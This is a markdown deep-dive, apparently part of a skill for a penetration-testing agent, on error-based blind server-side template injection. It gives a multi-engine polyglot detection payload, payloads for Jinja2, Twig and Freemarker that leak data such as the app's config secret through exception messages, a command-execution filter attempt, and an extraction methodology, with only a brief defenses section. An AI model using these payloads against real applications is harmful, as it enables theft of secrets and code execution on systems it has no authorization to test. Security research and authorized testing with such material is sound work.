> **Companion deep-dive for `SKILL.md` in this directory.**
> Source research: "Successful Errors: New Code Injection and SSTI Techniques" — PortSwigger Top-10 Web Hacking Techniques of 2025, #1.

# ERROR-BASED BLIND SSTI — "Successful Errors"

Blind SSTI where output is never rendered can still be exploited: force the template engine to *error out with data embedded in the error*. Adapts classic SQLi error-based thinking to template engines.

## 1. WHY THIS MATTERS

Traditional blind SSTI needs side-channels (delays, OOB). Error-based turns the engine's own exception messages into the exfil channel — often visible even when page output is fully suppressed (APIs returning `{"error": "..."}`, verbose middleware).

## 2. POLYGLOT DETECTION (find engines fast)

Send one payload containing markers for every major engine; whichever evaluates reveals itself:

```
${7*7}#{7*7}}{{7*7}}<%= 7*7 %>${{7*7}}#{ 7*7 }
```

Watch for ANY of: `49` appearing, engine-specific exception text (Twig/Jinja/Freemarker/Velocity/ERB/Smarty), or changed response structure.

## 3. ERROR-BASED EXTRACTION PATTERNS

### Jinja2 / Python
```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Force exception carrying data:
{{ x.y.z }}  # after setting context — errors echo attribute paths
{% for x in [config] %}{% endfor %}
# Deliberate type errors embed values:
{{ [][config.SECRET] }}   # KeyError message contains the secret
```

### Twig / PHP
```twig
{{ ['x']|filter('system') }}        # blocked? try error path:
{{ 1//0 }}                           # division error confirms evaluation
{{ app.request.attributes.get('nonexistent').foo }}
# Nested-property access on missing objects throws messages containing prior values
```

### Java (Freemarker / Velocity)
```freemarker
${1/0}                # arithmetic error = evaluation proof
${"".getClass()}      # if reflected in error → full RCE territory
```

## 4. METHODOLOGY

1. Detect evaluation with polyglot above (compare vs baseline response)
2. Find the error channel: does ANY input produce exceptions whose text reaches you?
3. Craft value-bearing errors: index/type/key errors that embed target data (`config`, `environment`, session)
4. Extract incrementally; keep PoC to 1–2 leaked values
5. Confirm engine + version from error signatures → check known gadget chains

## 5. FALSE POSITIVE TRAPS

- Framework's generic 500 page (no data) ≠ error-based channel — need DATA in the message
- WAF-simulated error pages echoing your raw payload = reflection, not evaluation
- Caching may serve stale errors — cache-bust every probe

## 6. DEFENSES (for reports)

Sandboxed autoescape modes, disable debug/error verbosity in prod, never render user input through engine re-parse, generic error handler at edge.
